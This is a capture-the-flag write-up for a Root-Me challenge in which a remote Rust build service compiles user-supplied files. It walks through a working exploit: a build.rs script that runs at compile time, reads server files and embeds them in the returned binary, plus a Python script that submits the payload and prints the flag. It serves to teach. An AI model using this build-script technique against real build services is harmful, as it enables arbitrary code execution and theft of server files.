# Build And Drustroy - Misc

### Challenge description

I love rust because it's secure and fast. So I want people to do MOAR rust.

That's why I made a microservice to allow fast and easy remote code compilation.

Send my your code, I'll compile it, and I know for sure I'm safe!

```bash
curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xmas.root-me.org/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}' --output binary
file binary # binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...
```

### Challenge code

According to the sources and the example provided, we are given a web service that accept rust code and return a binary remotly compiled.

The web service accept json payloads on the `POST /remote-build` route:

```rust
        (&Method::POST, "/remote-build") => {
            if !is_content_type_json(req.headers()) {
                let mut response = Response::new(full("Content-Type must be application/json"));
                *response.status_mut() = StatusCode::UNSUPPORTED_MEDIA_TYPE;
                return Ok(response);
            }

            let b: Bytes = req.collect().await?.to_bytes();
            let s: Value = match serde_json::from_slice(&b) {
                Ok(json) => json,
                Err(e) => {
                    eprintln!("JSON parsing error: {:?}", e);
                    let mut response = Response::new(full("Error parsing JSON"));
                    *response.status_mut() = StatusCode::BAD_REQUEST;
                    return Ok(response);
                }
            };

```

Then, the file structure describe in the payload and the files contents are written locally:

```rust
                for (filename, content) in &map {
                    let content_str = match content.as_str() {
                        Some(s) => s,
                        None => {
                            eprintln!("Content for file {} is not a string", filename);
                            let mut response = Response::new(full("Invalid content type for file"));
                            *response.status_mut() = StatusCode::BAD_REQUEST;
                            return Ok(response);
                        }
                    };

                    let file_path = temp_dir.path().join(filename);
                    if let Some(parent) = file_path.parent() {
                        if let Err(e) = fs::create_dir_all(parent).await {
                            eprintln!("Failed to create directories for {}: {:?}", filename, e);
                            let mut response = Response::new(full("Internal Server Error"));
                            *response.status_mut() = StatusCode::INTERNAL_SERVER_ERROR;
                            return Ok(response);
                        }
                    }
                    if let Err(e) = fs::write(&file_path, content_str.as_bytes()).await {
                        eprintln!("Failed to write file {}: {:?}", filename, e);
                        let mut response = Response::new(full("Internal Server Error"));
                        *response.status_mut() = StatusCode::INTERNAL_SERVER_ERROR;
                        return Ok(response);
                    }
                }
```

Finally, the rust code is compiled and return to the client as binary:

```rust
                let cargo_toml = r#"
[package]
name = "temp_build"
version = "0.1.0"
edition = "2021"

[dependencies]
"#;

                let build_output = match Command::new("cargo")
                    .args(&["build", "--release"])
                    .current_dir(temp_dir.path())
                    .output()
                    .await
                {
                    Ok(output) => output,
                    Err(e) => {
                        eprintln!("Failed to execute cargo build: {:?}", e);
                        let mut response = Response::new(full("Internal Server Error"));
                        *response.status_mut() = StatusCode::INTERNAL_SERVER_ERROR;
                        return Ok(response);
                    }
                };

                let binary_name = if cfg!(windows) {
                    "temp_build.exe"
                } else {
                    "temp_build"
                };

                let binary_path = temp_dir
                    .path()
                    .join("target")
                    .join("release")
                    .join(binary_name);

                let binary = match fs::read(&binary_path).await {
                    Ok(data) => data,
                    Err(e) => {
                        eprintln!("Failed to read binary: {:?}", e);
                        let mut response = Response::new(full("Internal Server Error"));
                        *response.status_mut() = StatusCode::INTERNAL_SERVER_ERROR;
                        return Ok(response);
                    }
                };

                let response = Response::builder()
                    .status(StatusCode::OK)
                    .header("Content-Type", "application/octet-stream")
                    .header("Content-Disposition", "attachment; filename=\"binary\"")
                    .body(full(binary))
                    .unwrap();
```

### (Unintended) Solution

As always, our goal is to retrieve the flag. In addition to the source code challenge, we are given a Dockerfile and a docker-compose.yml used to spawn the web service:

```yaml
services:
  chall:
    build: .
    ports:
      - 3000:3000
    volumes:
      - ./flag.txt:/flag/randomflaglolilolbigbisous.txt
      - /tmp # required for build & temp dirs
    restart: unless-stopped
    read_only: true
```

At this point there's two kind of people.

Regular people: "Ok, so the flag is located in `/flag` in a file named `randomflaglolilolbigbisous.txt`, let's flag with a oneliner exploit using builtins macros."

Me: "Ok, the flag file name is random, i need to find a RCE."

Fortunately, `cargo`, the rust swiss army knife, used to remotly compile the binary come with the ability to execute code at **compile time** using [build scripts](https://doc.rust-lang.org/cargo/reference/build-scripts.html). So we have our way to execute arbitrary code on the server. We can write a `build.rs` file that list files in the `/flag` directory and hardcoding their content into a `main.rs` that will be compiled and return to us as binary:

```rust
use std::fs;
use std::io;
use std::io::prelude::*;


fn main() -> io::Result<()> {
    let directory = "/tmp";
    let mut body = String::new();
    let entries = fs::read_dir(directory)?;
    for entry in entries {
        let path = entry?.path();
        if !path.is_dir() {
            let path_str = path.as_os_str().to_string_lossy();
            body.push_str(&format!("println!(\"File {path} contains: \")", path=&path_str));
            body.push_str(";\n\t");

            let mut content = fs::read_to_string(path)?;
            content = content.strip_suffix("\r\n").or(content.strip_suffix("\n")).unwrap_or(&content).to_string();
            content = content.replace("{", "{{").replace("}", "}}");
            body.push_str(&format!("println!(\"{content}\")", content=&content));
            body.push_str(";\n\t");
        }

    }
    println!("{}", format!("def main() {{
        {body}
    }}", body=body));

    let mut main_rs = fs::File::create("src/main.rs")?;
    main_rs.write_all(format!("fn main() {{
        {body}
    }}", body=body).as_bytes())?;


    Ok(())
}
```

We also need a "dummy" `main.rs`, otherwise `cargo` won't compile anything. Let's try it locally:

```bash
$ echo "RM{Th1s_i5_4_fak3_fl4g}" > /tmp/flag.txt
$ cat src/main.rs 
fn main() {
    println!("Hello, World!");
}
$ cargo run
   Compiling write_up v0.1.0 
    Finished dev [unoptimized + debuginfo] target(s) in 0.27s
     Running `target/debug/write_up`
File /tmp/flag.txt contains: 
RM{Th1s_i5_4_fak3_fl4g}
$ cat src/main.rs 
fn main() {
        println!("File /tmp/flag.txt contains: ");
	println!("RM{{Th1s_i5_4_fak3_fl4g}}");
	
    }%
```

It works ! Now remotly:

```python
import requests
import subprocess

payload = {"build.rs": open("build.rs").read(), "src/main.rs": open("src/main.rs").read()}

response = requests.post("https://day4.challenges.xmas.root-me.org/remote-build", json=payload, verify=False)

with open("binary", "wb") as f:
    f.write(response.content)

process = subprocess.Popen(["chmod", "+x", "binary"])
process.communicate()
process = subprocess.Popen(["./binary"])
out, _ = process.communicate()
print(out)
```

And we get the flag ! :
```
$ python exploit.py
File /flag/randomflaglolilolbigbisous.txt contains: 
OffenSkillSaysHi2024RustAbuse
```

Ok... So i guess the file name wasn't random and i used a way overkill exploit. But at least it was fun :D

### (Intended) solution

Using the macro `include_str` yield to the same result.
